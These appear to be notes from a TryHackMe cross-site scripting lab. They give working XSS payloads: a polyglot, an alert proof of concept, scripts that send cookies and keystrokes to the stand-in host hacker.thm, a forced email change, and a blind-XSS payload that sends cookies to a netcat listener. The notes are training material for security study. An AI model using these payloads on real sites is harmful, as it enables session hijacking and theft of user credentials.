## Polyglotte XSS 


```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e ```





## Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:


``` <script>alert('XSS');</script> ```


## Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.


```<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>```


## Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.


```<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>```


## Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:


```<script>user.changeEmail('attacker@hacker.thm');</script>```

## Blind XSS


Using the AttackBox, let’s set up a listening server using ```Netcat```. If we want to listen on port 9001, we issue the command ```nc -l -p 9001```. The -l option indicates that we want to use Netcat in listen mode, while the``` -p``` option is used to specify the port number. To avoid the resolution of hostnames via DNS, we can add ```-n```; moreover, to discover any errors, running Netcat in verbose mode by adding the -v option is recommended. The final command becomes ``` nc -n -l -v -p 9001 ```, equivalent to nc -nlvp 9001.

```bash
nc
user@machine$ nc -nlvp 9001
Listening on [0.0.0.0] (family 0, port 9001)

```
Now that we’ve set up the method of receiving the exfiltrated information, let’s build the payload.
```
</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
```
Let’s break down the payload:

The ```</textarea>``` tag closes the text area field.
The ``` <script>``` tag opens an area for us to write JavaScript.
The ```fetch()``` command makes an HTTP request.
```URL_OR_IP``` is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
```PORT_NUMBER``` is the port number you are using to listen for connections on the AttackBox.
```?cookie=``` is the query string containing the victim’s cookies.
```btoa()``` command base64 encodes the victim’s cookies.
```document.cookie``` accesses the victim’s cookies for the Acme IT Support Website.
```</script>```closes the JavaScript code block.

